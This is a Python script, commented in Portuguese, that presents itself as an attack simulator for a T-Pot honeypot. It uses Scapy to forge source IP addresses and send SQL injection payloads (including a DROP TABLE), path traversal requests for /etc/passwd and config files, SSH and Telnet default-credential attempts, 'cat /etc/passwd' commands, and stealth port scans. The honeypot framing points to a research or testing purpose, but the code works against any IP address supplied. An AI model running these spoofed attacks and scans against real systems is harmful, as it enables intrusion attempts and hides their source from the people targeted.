#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
T-Pot Attack Simulator com Scapy
Script para automação de simulações de ataques em um ambiente T-Pot
usando Scapy para forjar endereços IP de origem.
"""

import argparse
import time
import random
import ipaddress
import logging
import sys
import socket
import os
from concurrent.futures import ThreadPoolExecutor
from typing import List, Dict, Optional

# Importar Scapy
try:
    from scapy.all import *
    conf.verb = 0  # Suprime mensagens do Scapy
except ImportError:
    print("Scapy não está instalado. Instale com: pip install scapy")
    sys.exit(1)

# Configurar logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("attack_simulation_scapy.log"),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("attack_simulator_scapy")

class ScapyAttackSimulator:
    """Simulador de ataques para T-Pot usando Scapy"""
    
    def __init__(self, target_host: str, intensity: str = "medium", duration: int = 60, 
                 target_port: int = None, spoofed_ip: str = None, target_mac: str = None,
                 interface: str = None):
        """
        Inicializa o simulador de ataques
        
        Args:
            target_host: Endereço IP do T-Pot
            intensity: Intensidade dos ataques ("low", "medium", "high")
            duration: Duração total da simulação em minutos
            target_port: Porta de destino para ataques (opcional)
            spoofed_ip: IP de origem forjado (opcional, gera aleatório se não informado)
            target_mac: Endereço MAC do alvo (opcional, tenta descobrir se não informado)
            interface: Interface de rede para enviar os pacotes
        """
        self.target_host = target_host
        self.target_port = target_port
        self.intensity = intensity
        self.duration = duration * 60  # Converter para segundos
        self.spoofed_ip = spoofed_ip or self._generate_random_ip()
        self.interface = interface or conf.iface
        
        # Portas específicas do T-Pot (honeypots)
        self.tpot_ports = {
            'ssh': [22, 2222, 2223, 22, 64295],   # Cowrie SSH honeypot
            'telnet': [23, 2223, 2323],           # Cowrie Telnet honeypot
            'web': [80, 81, 8080, 8443, 9200],    # Web honeypots (Nginx, Glastopf, etc)
            'other': [21, 25, 110, 143, 445, 3306, 5432, 5900] # Outros honeypots
        }
        
        # Mapear intensidade para número de threads e pausa entre ataques
        self.intensity_map = {
            "low": {"threads": 2, "pause": (5, 10), "packets": (3, 8)},
            "medium": {"threads": 4, "pause": (2, 5), "packets": (8, 20)},
            "high": {"threads": 8, "pause": (0.5, 2), "packets": (20, 50)}
        }
        
        self.threads = self.intensity_map[intensity]["threads"]
        self.pause_range = self.intensity_map[intensity]["pause"]
        self.packet_count_range = self.intensity_map[intensity]["packets"]
        
        # Descobrir MAC do alvo se não informado
        self.target_mac = target_mac
        if not self.target_mac:
            self._discover_target_mac()
    
    def _generate_random_ip(self) -> str:
        """Gera um IP forjado aleatório (evitando IPs privados)"""
        # Lista de blocos comuns de IPs públicos
        public_ranges = [
            "2.0.0.0/8", "3.0.0.0/8", "5.0.0.0/8", "8.0.0.0/8", 
            "13.0.0.0/8", "23.0.0.0/8", "31.0.0.0/8", "37.0.0.0/8", 
            "45.0.0.0/8", "50.0.0.0/8", "64.0.0.0/8", "65.0.0.0/8",
            "66.0.0.0/8", "73.0.0.0/8", "77.0.0.0/8", "84.0.0.0/8",
            "104.0.0.0/8", "107.0.0.0/8", "108.0.0.0/8", "130.0.0.0/8"
        ]
        
        # Escolhe um range aleatório
        random_range = random.choice(public_ranges)
        network = ipaddress.IPv4Network(random_range)
        
        # Gera um IP aleatório dentro do range
        random_ip = str(network.network_address + random.randint(1, min(16777216, network.num_addresses - 2)))
        return random_ip
    
    def _discover_target_mac(self):
        """Tenta descobrir o MAC do alvo usando ARP"""
        try:
            # Tenta primeiro obter diretamente da tabela ARP local
            if sys.platform == 'win32':  # Windows
                try:
                    # No Windows, tente usar o comando arp para obter o MAC
                    import subprocess
                    output = subprocess.check_output(['arp', '-a'], text=True)
                    for line in output.splitlines():
                        if self.target_host in line:
                            # Formato típico: 192.168.18.254        00-1a-2b-3c-4d-5e     dinâmico
                            parts = line.split()
                            if len(parts) >= 2:
                                mac = parts[1].replace('-', ':')
                                self.target_mac = mac
                                logger.info(f"MAC do alvo obtido da tabela ARP: {self.target_mac}")
                                return
                except Exception as e:
                    logger.warning(f"Não foi possível obter MAC da tabela ARP: {str(e)}")
            
            # Se não conseguiu pelo método acima, tenta via pacote ARP
            logger.info(f"Enviando ARP request para descobrir MAC de {self.target_host}")
            
            # Usa uma função mais robusta para resolver o ARP
            # Configura timeout mais longo e mais tentativas
            ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=self.target_host), 
                            timeout=5, retry=5, verbose=0)
            
            if ans:
                self.target_mac = ans[0][1].hwsrc
                logger.info(f"MAC do alvo descoberto via ARP: {self.target_mac}")
            else:
                # Se ARP falhar, tente usar um MAC estático mais específico para o gateway
                # Isso geralmente é mais eficaz do que o broadcast para algumas redes
                gateway_ip = None
                
                # Tenta descobrir o gateway
                if sys.platform == 'win32':  # Windows
                    try:
                        output = subprocess.check_output(['route', 'print', '0.0.0.0'], text=True)
                        for line in output.splitlines():
                            if '0.0.0.0' in line and 'Gateway' not in line:
                                parts = line.split()
                                if len(parts) >= 4:
                                    gateway_ip = parts[3]
                                    break
                    except Exception as e:
                        logger.warning(f"Não foi possível obter gateway: {str(e)}")
                
                if gateway_ip:
                    logger.warning(f"Gateway descoberto: {gateway_ip}, usando como proxy para MAC")
                    # Assume que o alvo está através do gateway
                    gw_ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=gateway_ip), 
                                   timeout=2, retry=3, verbose=0)
                    if gw_ans:
                        self.target_mac = gw_ans[0][1].hwsrc
                        logger.info(f"Usando MAC do gateway: {self.target_mac}")
                    else:
                        logger.warning("Não foi possível descobrir MAC do gateway. Usando broadcast.")
                        self.target_mac = "ff:ff:ff:ff:ff:ff"
                else:
                    logger.warning("Não foi possível descobrir o MAC do alvo. Usando broadcast.")
                    self.target_mac = "ff:ff:ff:ff:ff:ff"
        except Exception as e:
            logger.error(f"Erro ao descobrir MAC: {str(e)}")
            logger.warning("Usando endereço MAC de broadcast")
            self.target_mac = "ff:ff:ff:ff:ff:ff"
    
    def _log_packet(self, packet, description: str, success: bool = True) -> None:
        """Registra informações sobre o pacote enviado"""
        if success:
            logger.info(f"Sucesso: {description}")
        else:
            logger.warning(f"Falha: {description}")
        
        logger.debug(f"Pacote: {packet.summary()}")
    
    def _simulate_web_attacks(self):
        """Simula ataques Web usando Scapy"""
        # Lista de payloads para injeção SQL
        sql_payloads = [
            "1' OR '1'='1", 
            "' OR 1=1 --", 
            "admin' --",
            "'; DROP TABLE users; --",
            "1'; SELECT * FROM users; --"
        ]
        
        # Lista de caminhos para tentar path traversal
        path_traversal = [
            "/../../../../etc/passwd",
            "/.git/config",
            "/wp-config.php",
            "/admin/",
            "/config.php"
        ]
        
        # Usar portas web do T-Pot
        if self.target_port is not None:
            port = self.target_port
        else:
            # Use as portas específicas do T-Pot para web
            port = random.choice(self.tpot_ports['web'])
        
        # Simular injeções SQL
        for _ in range(random.randint(3, 8)):
            payload = random.choice(sql_payloads)
            src_port = random.randint(1024, 65535)
            
            # Criar o pacote SYN
            syn = (Ether(dst=self.target_mac) /
                  IP(src=self.spoofed_ip, dst=self.target_host) /
                  TCP(sport=src_port, dport=port, flags="S"))
            
            # Enviar pacote SYN e esperar por SYN-ACK
            try:
                response = srp1(syn, timeout=2, verbose=0, iface=self.interface)
                
                if response and response.haslayer(TCP) and response[TCP].flags & 0x12:  # SYN-ACK
                    # Enviar ACK para completar o three-way handshake
                    ack = (Ether(dst=self.target_mac) /
                          IP(src=self.spoofed_ip, dst=self.target_host) /
                          TCP(sport=src_port, dport=port, flags="A", 
                              seq=syn[TCP].seq+1, ack=response[TCP].seq+1))
                    send(ack, verbose=0, iface=self.interface)
                    
                    # Montar e enviar o HTTP GET com payload SQL injection
                    http_req = (Ether(dst=self.target_mac) /
                               IP(src=self.spoofed_ip, dst=self.target_host) /
                               TCP(sport=src_port, dport=port, flags="PA", 
                                   seq=syn[TCP].seq+1, ack=response[TCP].seq+1) /
                               Raw(load=f"GET /search?q={payload} HTTP/1.1\r\nHost: {self.target_host}\r\n\r\n"))
                    
                    send(http_req, verbose=0, iface=self.interface)
                    
                    # Enviar FIN para fechar a conexão
                    fin = (Ether(dst=self.target_mac) /
                          IP(src=self.spoofed_ip, dst=self.target_host) /
                          TCP(sport=src_port, dport=port, flags="FA", 
                              seq=syn[TCP].seq+len(http_req[Raw].load)+1, 
                              ack=response[TCP].seq+1))
                    
                    send(fin, verbose=0, iface=self.interface)
                    
                    self._log_packet(http_req, f"Injeção SQL no endpoint search na porta {port}: {payload}")
                else:
                    # Simplesmente envia o pacote SYN (escaneamento) se não receber SYN-ACK
                    send(syn, verbose=0, iface=self.interface)
                    self._log_packet(syn, f"Escaneamento de porta web {port} com payload SQL")
            except Exception as e:
                logger.error(f"Erro em ataque web para porta {port}: {str(e)}")
            
            time.sleep(random.uniform(*self.pause_range))
        
        # Simular path traversal
        for _ in range(random.randint(3, 6)):
            path = random.choice(path_traversal)
            src_port = random.randint(1024, 65535)
            
            # Criar o pacote HTTP com path traversal
            syn = (Ether(dst=self.target_mac) /
                  IP(src=self.spoofed_ip, dst=self.target_host) /
                  TCP(sport=src_port, dport=port, flags="S"))
            
            send(syn, verbose=0)
            
            try:
                response = srp1(syn, timeout=2, verbose=0)
                
                if response and response.haslayer(TCP) and response[TCP].flags & 0x12:
                    # Three-way handshake
                    ack = (Ether(dst=self.target_mac) /
                          IP(src=self.spoofed_ip, dst=self.target_host) /
                          TCP(sport=src_port, dport=port, flags="A", 
                              seq=syn[TCP].seq+1, ack=response[TCP].seq+1))
                    send(ack, verbose=0)
                    
                    # HTTP GET com path traversal
                    http_req = (Ether(dst=self.target_mac) /
                               IP(src=self.spoofed_ip, dst=self.target_host) /
                               TCP(sport=src_port, dport=port, flags="PA", 
                                   seq=syn[TCP].seq+1, ack=response[TCP].seq+1) /
                               Raw(load=f"GET {path} HTTP/1.1\r\nHost: {self.target_host}\r\n\r\n"))
                    
                    send(http_req, verbose=0)
                    
                    self._log_packet(http_req, f"Path Traversal: {path}")
                else:
                    # Simplesmente envia o pacote SYN se não receber SYN-ACK
                    self._log_packet(syn, f"Escaneamento de porta web {port} para path traversal")
            except Exception as e:
                logger.error(f"Erro em path traversal: {str(e)}")
            
            time.sleep(random.uniform(*self.pause_range))

    def _simulate_ssh_attacks(self):
        """Simula ataques SSH usando Scapy"""
        # Escolher uma porta SSH do T-Pot
        if self.target_port:
            port = self.target_port
        else:
            port = random.choice(self.tpot_ports['ssh'])
        
        # Número de tentativas
        num_attempts = random.randint(3, 8)
        
        for _ in range(num_attempts):
            src_port = random.randint(1024, 65535)
            
            # Cria e envia pacote SYN para iniciar conexão SSH
            syn = (Ether(dst=self.target_mac) /
                  IP(src=self.spoofed_ip, dst=self.target_host) /
                  TCP(sport=src_port, dport=port, flags="S"))
            
            try:
                logger.info(f"Tentando conexão SSH na porta {port}")
                response = srp1(syn, timeout=2, verbose=0, iface=self.interface)
                
                if response and response.haslayer(TCP) and response[TCP].flags & 0x12:
                    # Completa handshake com ACK
                    ack = (Ether(dst=self.target_mac) /
                          IP(src=self.spoofed_ip, dst=self.target_host) /
                          TCP(sport=src_port, dport=port, flags="A", 
                              seq=syn[TCP].seq+1, ack=response[TCP].seq+1))
                    send(ack, verbose=0, iface=self.interface)
                    
                    # Envia alguns pacotes de dados simulando protocolo SSH
                    for i in range(3):
                        # Simulação simplificada de pacotes SSH (não são pacotes SSH válidos)
                        ssh_data = (Ether(dst=self.target_mac) /
                                  IP(src=self.spoofed_ip, dst=self.target_host) /
                                  TCP(sport=src_port, dport=port, flags="PA", 
                                      seq=syn[TCP].seq+1+i*10, ack=response[TCP].seq+1) /
                                  Raw(load=b"SSH-2.0-OpenSSH_7.9\r\n"))
                        
                        send(ssh_data, verbose=0, iface=self.interface)
                        time.sleep(random.uniform(0.2, 0.8))
                    
                    # Simulando tentativa de login
                    login_attempt = (Ether(dst=self.target_mac) /
                                  IP(src=self.spoofed_ip, dst=self.target_host) /
                                  TCP(sport=src_port, dport=port, flags="PA", 
                                      seq=syn[TCP].seq+31, ack=response[TCP].seq+1) /
                                  Raw(load=b"root\n"))
                    
                    send(login_attempt, verbose=0, iface=self.interface)
                    time.sleep(random.uniform(0.5, 1.0))
                    
                    # Simulando tentativa de senha
                    password_attempt = (Ether(dst=self.target_mac) /
                                  IP(src=self.spoofed_ip, dst=self.target_host) /
                                  TCP(sport=src_port, dport=port, flags="PA", 
                                      seq=syn[TCP].seq+36, ack=response[TCP].seq+1) /
                                  Raw(load=b"password123\n"))
                    
                    send(password_attempt, verbose=0, iface=self.interface)
                    
                    # Fecha a conexão
                    fin = (Ether(dst=self.target_mac) /
                          IP(src=self.spoofed_ip, dst=self.target_host) /
                          TCP(sport=src_port, dport=port, flags="FA", 
                              seq=syn[TCP].seq+47, ack=response[TCP].seq+1))
                    send(fin, verbose=0, iface=self.interface)
                    
                    self._log_packet(login_attempt, f"Tentativa SSH com credenciais na porta {port}")
                else:
                    # Mesmo sem resposta, podemos tentar alguns pacotes para ver se o honeypot os captura
                    syn_packets = random.randint(3, 10)
                    for _ in range(syn_packets):
                        # Enviar múltiplos SYNs para simular scan
                        new_syn = (Ether(dst=self.target_mac) /
                                 IP(src=self.spoofed_ip, dst=self.target_host) /
                                 TCP(sport=random.randint(1024, 65535), dport=port, flags="S"))
                        send(new_syn, verbose=0, iface=self.interface)
                        time.sleep(0.1)
                    self._log_packet(syn, f"Múltiplos SYN enviados para porta SSH {port} (sem resposta)", False)
            except Exception as e:
                logger.error(f"Erro em ataque SSH para porta {port}: {str(e)}")
            
            time.sleep(random.uniform(*self.pause_range))

    def _simulate_telnet_attack(self):
        """Simula ataques Telnet usando Scapy"""
        # Escolher uma porta Telnet do T-Pot
        if self.target_port:
            port = self.target_port
        else:
            port = random.choice(self.tpot_ports['telnet'])
            
        src_port = random.randint(1024, 65535)
        
        # Tenta estabelecer uma conexão Telnet (SYN)
        syn = (Ether(dst=self.target_mac) /
              IP(src=self.spoofed_ip, dst=self.target_host) /
              TCP(sport=src_port, dport=port, flags="S"))
        
        try:
            logger.info(f"Tentando conexão Telnet na porta {port}")
            # Envia o SYN e aguarda resposta
            response = srp1(syn, timeout=2, verbose=0, iface=self.interface)
            
            if response and response.haslayer(TCP) and response[TCP].flags & 0x12:
                # Envia ACK para completar o handshake
                ack = (Ether(dst=self.target_mac) /
                      IP(src=self.spoofed_ip, dst=self.target_host) /
                      TCP(sport=src_port, dport=port, flags="A", 
                          seq=syn[TCP].seq+1, ack=response[TCP].seq+1))
                send(ack, verbose=0, iface=self.interface)
                
                # Lista de comandos Telnet comuns
                telnet_commands = [
                    "admin\r\n", 
                    "password\r\n", 
                    "ls -la\r\n", 
                    "cat /etc/passwd\r\n",
                    "uname -a\r\n"
                ]
                
                # Envia cada comando
                seq_num = syn[TCP].seq + 1
                for cmd in telnet_commands:
                    cmd_packet = (Ether(dst=self.target_mac) /
                                 IP(src=self.spoofed_ip, dst=self.target_host) /
                                 TCP(sport=src_port, dport=port, flags="PA", 
                                     seq=seq_num, ack=response[TCP].seq+1) /
                                 Raw(load=cmd))
                    
                    send(cmd_packet, verbose=0, iface=self.interface)
                    seq_num += len(cmd)
                    
                    self._log_packet(cmd_packet, f"Comando Telnet na porta {port}: {cmd.strip()}")
                    time.sleep(random.uniform(0.5, 1.5))
                
                # Fecha a conexão
                fin = (Ether(dst=self.target_mac) /
                      IP(src=self.spoofed_ip, dst=self.target_host) /
                      TCP(sport=src_port, dport=port, flags="FA", 
                          seq=seq_num, ack=response[TCP].seq+1))
                send(fin, verbose=0, iface=self.interface)
            else:
                # Mesmo sem resposta, tente alguns pacotes
                for _ in range(3):
                    data_packet = (Ether(dst=self.target_mac) /
                                 IP(src=self.spoofed_ip, dst=self.target_host) /
                                 TCP(sport=src_port, dport=port, flags="PA", 
                                     seq=syn[TCP].seq+1) /
                                 Raw(load=b"admin\r\npassword\r\n"))
                    
                    send(data_packet, verbose=0, iface=self.interface)
                    time.sleep(0.5)
                
                self._log_packet(syn, f"Tentativa Telnet na porta {port} sem resposta", False)
                
        except Exception as e:
            logger.error(f"Erro em ataque Telnet para porta {port}: {str(e)}")

    def _simulate_port_scan(self):
        """Simula escaneamento de portas usando Scapy"""
        # Combinar todas as portas dos honeypots para escanear
        all_ports = []
        for port_list in self.tpot_ports.values():
            all_ports.extend(port_list)
        
        # Se uma porta específica foi informada, escanear apenas ela
        if self.target_port:
            scan_ports = [self.target_port]
        else:
            # Escolhe um subconjunto aleatório de portas
            num_ports = random.randint(8, 15)
            scan_ports = random.sample(all_ports, min(num_ports, len(all_ports)))
        
        # Escolhe um tipo de scan aleatório
        scan_type = random.choice(["SYN", "FIN", "XMAS", "NULL", "ACK"])
        
        logger.info(f"Iniciando port scan {scan_type} para {len(scan_ports)} portas")
        
        # Configura as flags baseado no tipo de scan
        if scan_type == "SYN":
            flags = "S"
        elif scan_type == "FIN":
            flags = "F"
        elif scan_type == "XMAS":
            flags = "FPU"  # FIN, PSH, URG
        elif scan_type == "NULL":
            flags = ""     # Sem flags
        elif scan_type == "ACK":
            flags = "A"
        
        # Executa o scan para cada porta
        for port in scan_ports:
            src_port = random.randint(1024, 65535)
            
            # Monta o pacote
            packet = (Ether(dst=self.target_mac) /
                     IP(src=self.spoofed_ip, dst=self.target_host) /
                     TCP(sport=src_port, dport=port, flags=flags))
            
            # Envia o pacote
            send(packet, verbose=0, iface=self.interface)
            
            self._log_packet(packet, f"Port scan {scan_type} na porta {port}")
            
            # Pequena pausa entre pacotes
            time.sleep(random.uniform(0.1, 0.5))

    def _simulate_random_connections(self):
        """Tenta conexões em portas diversas usando Scapy"""
        # Combinar todas as portas dos honeypots
        all_ports = []
        for port_list in self.tpot_ports.values():
            all_ports.extend(port_list)
        
        # Número de portas para testar
        num_ports = random.randint(5, 10)
        
        for _ in range(num_ports):
            if self.target_port:
                port = self.target_port
            else:
                port = random.choice(all_ports)
                
            src_port = random.randint(1024, 65535)
            
            # Cria e envia pacote SYN
            packet = (Ether(dst=self.target_mac) /
                     IP(src=self.spoofed_ip, dst=self.target_host) /
                     TCP(sport=src_port, dport=port, flags="S"))
            
            send(packet, verbose=0, iface=self.interface)
            
            # Adicionar pacotes com dados para portas populares
            if port in self.tpot_ports['web']:
                # Adicionar HTTP GET para portas web
                syn_ack = srp1(packet, timeout=1, verbose=0, iface=self.interface)
                if syn_ack and syn_ack.haslayer(TCP):
                    # Enviar ACK
                    ack = (Ether(dst=self.target_mac) /
                          IP(src=self.spoofed_ip, dst=self.target_host) /
                          TCP(sport=src_port, dport=port, flags="A", 
                              seq=packet[TCP].seq+1, ack=syn_ack[TCP].seq+1))
                    send(ack, verbose=0, iface=self.interface)
                    
                    # Enviar HTTP GET
                    http_get = (Ether(dst=self.target_mac) /
                               IP(src=self.spoofed_ip, dst=self.target_host) /
                               TCP(sport=src_port, dport=port, flags="PA", 
                                   seq=packet[TCP].seq+1, ack=syn_ack[TCP].seq+1) /
                               Raw(load=b"GET / HTTP/1.1\r\nHost: honeypot\r\n\r\n"))
                    send(http_get, verbose=0, iface=self.interface)
            
            self._log_packet(packet, f"Conexão na porta {port}")
            
            time.sleep(random.uniform(*self.pause_range))

    def _attack_worker(self):
        """Função de trabalho para threads"""
        # Lista de todas as simulações disponíveis
        attack_functions = [
            self._simulate_ssh_attacks,
            self._simulate_web_attacks,
            self._simulate_port_scan,
            self._simulate_telnet_attack,
            self._simulate_random_connections
        ]
        
        # Executa até o tempo limite
        start_time = time.time()
        while time.time() - start_time < self.duration:
            # Escolhe um ataque aleatoriamente
            attack_function = random.choice(attack_functions)
            attack_function()
            
            # Pausa entre ataques
            time.sleep(random.uniform(*self.pause_range))
    
    def run(self):
        """Executa a simulação de ataques"""
        logger.info(f"Iniciando simulação de ataques contra {self.target_host}")
        logger.info(f"Intensidade: {self.intensity} ({self.threads} threads)")
        logger.info(f"Duração: {self.duration/60:.1f} minutos")
        logger.info(f"IP de origem forjado: {self.spoofed_ip}")
        logger.info(f"MAC do alvo: {self.target_mac}")
        logger.info(f"Interface de rede: {self.interface}")
        
        start_time = time.time()
        
        # Utilizar ThreadPoolExecutor para paralelizar os ataques
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self._attack_worker) for _ in range(self.threads)]
            
            for future in futures:
                try:
                    future.result()
                except Exception as e:
                    logger.error(f"Erro em thread de ataques: {str(e)}")
        
        elapsed = time.time() - start_time
        logger.info(f"Simulação concluída em {elapsed:.1f} segundos")


def main():
    """Função principal do simulador"""
    parser = argparse.ArgumentParser(description="Simulador de ataques para T-Pot com Scapy")
    
    parser.add_argument("target_host", 
                       help="Endereço IP do T-Pot alvo")

    parser.add_argument("--port", "-p",
                       type=int,
                       default=None,
                       help="Porta de destino para ataques (opcional)")
    
    parser.add_argument("--intensity", "-i",
                       choices=["low", "medium", "high"],
                       default="medium",
                       help="Intensidade dos ataques simulados (padrão: medium)")
    
    parser.add_argument("--duration", "-d",
                       type=int,
                       default=60,
                       help="Duração da simulação em minutos (padrão: 60)")
    
    parser.add_argument("--spoofed-ip", "-s",
                       default=None,
                       help="IP de origem forjado (opcional, gera aleatório se não informado)")
    
    parser.add_argument("--target-mac", "-m",
                       default=None,
                       help="Endereço MAC do alvo (opcional, tenta descobrir se não informado)")
    
    parser.add_argument("--interface", "-if",
                       default=None,
                       help="Interface de rede para enviar os pacotes (opcional)")
    
    args = parser.parse_args()
    
    # Validar o endereço IP do alvo
    try:
        ipaddress.ip_address(args.target_host)
    except ValueError:
        logger.error(f"O alvo '{args.target_host}' não é um endereço IP válido.")
        logger.error("Para usar Scapy com IP forjado, é necessário um endereço IP válido.")
        sys.exit(1)
    
    # Validar o IP forjado, se informado
    if args.spoofed_ip:
        try:
            ipaddress.ip_address(args.spoofed_ip)
        except ValueError:
            logger.error(f"O IP forjado '{args.spoofed_ip}' não é um endereço IP válido.")
            sys.exit(1)
    
    # Criar e executar o simulador
    simulator = ScapyAttackSimulator(
        target_host=args.target_host,
        intensity=args.intensity,
        duration=args.duration,
        target_port=args.port,  # Corrigido: usando args.port em vez de args.target_port
        spoofed_ip=args.spoofed_ip,
        target_mac=args.target_mac,
        interface=args.interface
    )
    
    try:
        simulator.run()
    except KeyboardInterrupt:
        logger.info("Simulação interrompida pelo usuário")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Erro na simulação: {str(e)}")
        sys.exit(1)


if __name__ == "__main__":
    # Verificar se está rodando como root/admin (necessário para raw sockets)
    try:
        is_admin = os.geteuid() == 0
    except AttributeError:
        # Windows não tem geteuid, verificar de outra forma
        try:
            is_admin = os.getuid() == 0
        except AttributeError:
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    
    if not is_admin:
        print("Este script precisa ser executado como Administrador (root) para manipular pacotes brutos.")
        print("No Windows: Clique com o botão direito no prompt de comando ou PowerShell e selecione 'Executar como administrador'")
        print("No Linux: Use 'sudo python3 attack_simulator_scapy.py ...'")
        sys.exit(1)
    
    main()